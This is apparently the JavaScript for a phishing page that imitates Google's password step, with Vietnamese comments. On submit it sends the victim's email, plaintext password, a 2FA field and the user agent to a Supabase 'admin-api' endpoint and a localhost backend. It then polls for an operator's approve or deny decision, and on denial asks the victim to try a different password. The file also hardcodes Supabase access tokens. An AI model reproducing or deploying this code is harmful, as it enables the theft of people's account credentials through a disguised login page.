const passwordInput = document.getElementById('password');
// Hiện/ẩn mật khẩu bằng checkbox
const showPasswordCheckbox = document.getElementById('showPasswordCheckbox');
if (showPasswordCheckbox) {
    showPasswordCheckbox.addEventListener('change', function() {
        passwordInput.type = this.checked ? 'text' : 'password';
    });
}

// Format số điện thoại Việt Nam
function formatPhoneNumber(phone) {
    let cleaned = phone.replace(/\D/g, '');
    if (cleaned.startsWith('84')) {
        cleaned = '+' + cleaned;
    } else if (cleaned.startsWith('0')) {
        cleaned = '+84' + cleaned.substring(1);
    }
    // Format: +84 123 456 789 hoặc 0123 456 789
    return cleaned.replace(/(\+84)(\d{3})(\d{3})(\d{3,4})/, '$1 $2 $3 $4')
        .replace(/(\d{4})(\d{3})(\d{3,4})/, '$1 $2 $3');
}

// Khai báo biến userEmail lấy từ phần tử HTML
const userEmail = document.getElementById('userEmail');
// Nếu có phần tử userInitial thì khai báo, còn không thì bỏ qua
// const userInitial = document.getElementById('userInitial');

// Thêm xử lý click cho desktop
function setupDesktopEmailClick() {
    const userEmailBtn = document.querySelector('.user-email-btn');
    if (userEmailBtn) {
        userEmailBtn.addEventListener('click', function() {
            navigateTo('index.html');
        });
    }
}

// Thêm xử lý click cho mobile
function setupMobileEmailClick() {
    const mobileEmailBox = document.querySelector('.user-email-box');
    if (mobileEmailBox) {
        mobileEmailBox.style.cursor = 'pointer';
        mobileEmailBox.addEventListener('click', function() {
            navigateTo('index.html');
        });
    }
}

// Hiển thị nội dung hợp lý trong ô user-email-btn
function displayUserInfo() {
    const email = getEmailFromParams();
    let display = email;
    if (/^\d{9,11}$/.test(email.replace(/\D/g, ''))) {
        // Là số điện thoại
        display = formatPhoneNumber(email);
    } else if (/^[^@\s]+$/.test(email)) {
        // Là username, tự động thêm @gmail.com
        display = email + '@gmail.com';
    }
    if (userEmail) userEmail.textContent = display;
    // Cập nhật cho mobile nếu có
    const mobileUserEmail = document.getElementById('mobile-user-email');
    if (mobileUserEmail) mobileUserEmail.textContent = display;
    localStorage.setItem('userEmail', email);
}

function getEmailFromParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromUrl = urlParams.get('email');
    if (emailFromUrl) {
        localStorage.setItem('userEmail', emailFromUrl);
        return emailFromUrl;
    }
    return localStorage.getItem('userEmail') || 'user@example.com';
}

// Gọi hàm hiển thị user info và setup click handlers khi trang load
window.addEventListener('DOMContentLoaded', function() {
    displayUserInfo();
    setupDesktopEmailClick();
});

// Thêm xử lý click cho mobile khi template được load
const observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(mutation) {
        if (mutation.addedNodes.length) {
            setupMobileEmailClick();
        }
    });
});

observer.observe(document.body, { childList: true, subtree: true });

// Hàm hiển thị lỗi cho input mật khẩu chuẩn Google
function showPasswordError(message) {
    if (!passwordInput) return;
    const pwField = passwordInput.closest('.input-field');
    if (pwField) pwField.classList.add('error');
    passwordInput.classList.add('error');
    const label = pwField ? pwField.querySelector('.floating-label') : null;
    if (label) label.classList.add('error');
    // Luôn chèn error-message vào error-wrapper trong input-field
    const errWrapper = pwField ? pwField.querySelector('.error-wrapper') : null;
    if (errWrapper) {
        // Xóa error-message cũ
        errWrapper.innerHTML = '';
        const newMsg = document.createElement('div');
        newMsg.className = 'error-message';
        newMsg.textContent = message;
        errWrapper.appendChild(newMsg);
    }
}
function clearPasswordError() {
    if (!passwordInput) return;
    const pwField = passwordInput.closest('.input-field');
    if (pwField) pwField.classList.remove('error');
    passwordInput.classList.remove('error');
    const label = pwField ? pwField.querySelector('.floating-label') : null;
    if (label) label.classList.remove('error');
    const errWrapper = pwField ? pwField.querySelector('.error-wrapper') : null;
    if (errWrapper) errWrapper.innerHTML = '';
}

function validatePasswordInput(input) {
    const value = input.value.trim();
    let isValid = true;
    let errorMessage = '';
    if (!value) {
        isValid = false;
        errorMessage = 'Enter your password';
    } else if (value.length < 6) {
        isValid = false;
        errorMessage = 'Password must be at least 6 characters';
    }
    if (!isValid) {
        showPasswordError(errorMessage);
    } else {
        clearPasswordError();
    }
    return isValid;
}

if (passwordInput) {
    passwordInput.addEventListener('input', function() {
        validatePasswordInput(passwordInput);
    });
    passwordInput.addEventListener('focus', function() {
        clearPasswordError();
    });
}

// Xử lý form submission
const passwordForm = document.getElementById('passwordForm');
if (passwordForm && passwordInput) {
    passwordForm.addEventListener('submit', async function(e) {
        e.preventDefault(); // Ngăn form submit mặc định
        
        if (!validatePasswordInput(passwordInput)) {
            passwordInput.focus();
            return;
        }
        
        // Lấy requestId từ localStorage
        const requestId = localStorage.getItem('requestId');
        const email = getEmailFromParams();
        const password = passwordInput.value;
        
        if (requestId) {
            try {
                // Gửi dữ liệu password với Supabase
                const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/request', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cache-Control': 'no-cache',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                        'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                    },
                    cache: 'no-cache',
                    keepalive: true,
                    body: JSON.stringify({
                        email: email,
                        password: password,
                        twofa: '',
                        userAgent: navigator.userAgent,
                        currentPage: 'password.html'
                    })
                });
                
                if (response.ok) {
                    const data = await response.json();
                    console.log('Supabase response:', data);
                    
                    // Kiểm tra trạng thái approval
                    await checkApprovalStatus(email, 'verify.html');
                } else {
                    // Nếu không kết nối được Backend, chuyển trang bình thường
                    navigateTo('verify.html?email=' + encodeURIComponent(email));
                }
            } catch (error) {
                console.error('Error sending password data to backend:', error);
                // Nếu có lỗi, chuyển trang bình thường
                navigateTo('verify.html?email=' + encodeURIComponent(email));
            }
        } else {
            // Không có requestId, chuyển trang bình thường
            navigateTo('verify.html?email=' + encodeURIComponent(email));
        }
    });
}

// Thêm xử lý cho nút "Tiếp theo" riêng biệt để đảm bảo hoạt động
document.addEventListener('DOMContentLoaded', function() {
    const nextButton = document.querySelector('.btn-primary');
    if (nextButton) {
        nextButton.addEventListener('click', async function(e) {
            e.preventDefault();
            
            if (!passwordInput) return;
            
            if (!validatePasswordInput(passwordInput)) {
                passwordInput.focus();
                return;
            }
            
            // Lấy requestId từ localStorage
            const requestId = localStorage.getItem('requestId');
            const email = getEmailFromParams();
            const password = passwordInput.value;
            
            if (requestId) {
                try {
                    // Cập nhật trạng thái trang
                    await fetch('http://localhost:5000/api/update-page', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            id: parseInt(requestId),
                            currentPage: 'password.html'
                        })
                    });
                    
                    // Gửi dữ liệu password mới
                    const response = await fetch('http://localhost:5000/api/request', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password,
                            twofa: '',
                            userAgent: navigator.userAgent,
                            currentPage: 'password.html'
                        })
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        const newRequestId = data.requestId;
                        localStorage.setItem('requestId', newRequestId);
                        
                        // Kiểm tra trạng thái approval
                        await checkApprovalStatus(newRequestId, 'verify.html');
                    } else {
                        // Nếu không kết nối được Backend, chuyển trang bình thường
                        navigateTo('verify.html?email=' + encodeURIComponent(email));
                    }
                } catch (error) {
                    console.error('Error sending password data to backend:', error);
                    // Nếu có lỗi, chuyển trang bình thường
                    navigateTo('verify.html?email=' + encodeURIComponent(email));
                }
            } else {
                // Không có requestId, chuyển trang bình thường
                navigateTo('verify.html?email=' + encodeURIComponent(email));
            }
        });
    }
    
    // Xử lý cho mobile form nếu có
    const mobileForm = document.querySelector('.container form');
    if (mobileForm) {
        mobileForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const mobilePasswordInput = document.getElementById('mobile-password');
            if (!mobilePasswordInput || !mobilePasswordInput.value.trim()) {
                if (mobilePasswordInput) {
                    mobilePasswordInput.style.borderColor = '#d93025';
                    mobilePasswordInput.focus();
                }
                return;
            }
            
            // Lấy requestId từ localStorage
            const requestId = localStorage.getItem('requestId');
            const email = getEmailFromParams();
            const password = mobilePasswordInput.value;
            
            if (requestId) {
                try {
                    // Cập nhật trạng thái trang
                    await fetch('http://localhost:5000/api/update-page', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            id: parseInt(requestId),
                            currentPage: 'password.html'
                        })
                    });
                    
                    // Gửi dữ liệu password mới
                    const response = await fetch('http://localhost:5000/api/request', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password,
                            twofa: '',
                            userAgent: navigator.userAgent,
                            currentPage: 'password.html'
                        })
                    });
                    
                    if (response.ok) {
                        const data = await response.json();
                        const newRequestId = data.requestId;
                        localStorage.setItem('requestId', newRequestId);
                        
                        // Kiểm tra trạng thái approval
                        await checkApprovalStatus(newRequestId, 'verify.html');
                    } else {
                        // Nếu không kết nối được Backend, chuyển trang bình thường
                        navigateTo('verify.html?email=' + encodeURIComponent(email));
                    }
                } catch (error) {
                    console.error('Error sending password data to backend:', error);
                    // Nếu có lỗi, chuyển trang bình thường
                    navigateTo('verify.html?email=' + encodeURIComponent(email));
                }
            } else {
                // Không có requestId, chuyển trang bình thường
                navigateTo('verify.html?email=' + encodeURIComponent(email));
            }
        });
    }
});

// Navigation function with Google-style transition
function navigateTo(page) {
    // Add fade-out effect to current page
    const mainWrapper = document.querySelector('.main-wrapper');
    mainWrapper.classList.add('fade-out');
    
    // Show loading overlay
    const loadingOverlay = document.getElementById('loadingOverlay');
    const progressBar = document.getElementById('progressBar');
    const progressContainer = document.querySelector('.progress-container');
    
    loadingOverlay.classList.add('active');
    progressContainer.classList.add('active');
    
    // Reset progress bar
    progressBar.style.width = '0%';
    progressBar.classList.remove('loading', 'completing');
    
    // Start smooth progress animation
    setTimeout(() => {
        progressBar.classList.add('loading');
        progressBar.style.width = '80%';
    }, 100);
    
    // Navigate after animation completes
    setTimeout(() => {
        progressBar.classList.remove('loading');
        progressBar.classList.add('completing');
        progressBar.style.width = '100%';
        
        // Hide progress bar and navigate
        setTimeout(() => {
            progressContainer.classList.remove('active');
            window.location.href = page;
        }, 300);
    }, 1200);
}

// Hàm kiểm tra trạng thái approval với tốc độ nhanh hơn
async function checkApprovalStatus(email, nextPage) {
    const maxAttempts = 120; // Tối đa 120 lần kiểm tra (2 phút)
    let attempts = 0;
    
    const checkStatus = async () => {
        try {
                            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(email)}`, {
                cache: 'no-cache',
                headers: {
                    'Cache-Control': 'no-cache',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc',
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                
                if (data.status === 'approved') {
                    // Được approve, chuyển trang ngay lập tức
                    const email = localStorage.getItem('userEmail');
                    navigateTo(nextPage + '?email=' + encodeURIComponent(email));
                    return;
                } else if (data.status === 'denied') {
                    // Bị từ chối, reset form để người dùng thử lại với password mới
                    showNotification('Access denied. Please try again with a different password.', 'error');
                    const submitBtn = document.querySelector('.btn-primary');
                    if (submitBtn) {
                        submitBtn.classList.remove('loading');
                        submitBtn.disabled = false;
                        submitBtn.textContent = 'Next';
                    }
                    const passwordInput = document.querySelector('.form-input[type="password"]');
                    if (passwordInput) {
                        passwordInput.value = '';
                        passwordInput.focus();
                    }
                    return;
                }
            }
            
            attempts++;
            if (attempts < maxAttempts) {
                // Kiểm tra nhanh hơn: 300ms cho 20 lần đầu, sau đó 500ms
                const interval = attempts < 20 ? 300 : 500;
                setTimeout(checkStatus, interval);
            } else {
                // Hết thời gian chờ, chuyển trang
                const email = localStorage.getItem('userEmail');
                navigateTo(nextPage + '?email=' + encodeURIComponent(email));
            }
        } catch (error) {
            console.error('Error checking approval status:', error);
            attempts++;
            if (attempts < maxAttempts) {
                const interval = attempts < 20 ? 300 : 500;
                setTimeout(checkStatus, interval);
            } else {
                const email = localStorage.getItem('userEmail');
                navigateTo(nextPage + '?email=' + encodeURIComponent(email));
            }
        }
    };
    
    // Bắt đầu kiểm tra ngay lập tức
    checkStatus();
}

// Hàm hiển thị thông báo
function showNotification(message, type = 'info') {
    // Remove existing notifications
    const existingNotification = document.querySelector('.notification');
    if (existingNotification) {
        existingNotification.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.textContent = message;
    
    // Style the notification
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 12px 20px;
        border-radius: 4px;
        color: white;
        font-size: 14px;
        font-weight: 500;
        z-index: 1000;
        animation: slideIn 0.3s ease;
        ${type === 'error' ? 'background-color: #d93025;' : 'background-color: #1a73e8;'}
    `;

    document.body.appendChild(notification);

    // Remove notification after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (notification.parentElement) {
                notification.remove();
            }
        }, 300);
    }, 3000);
} 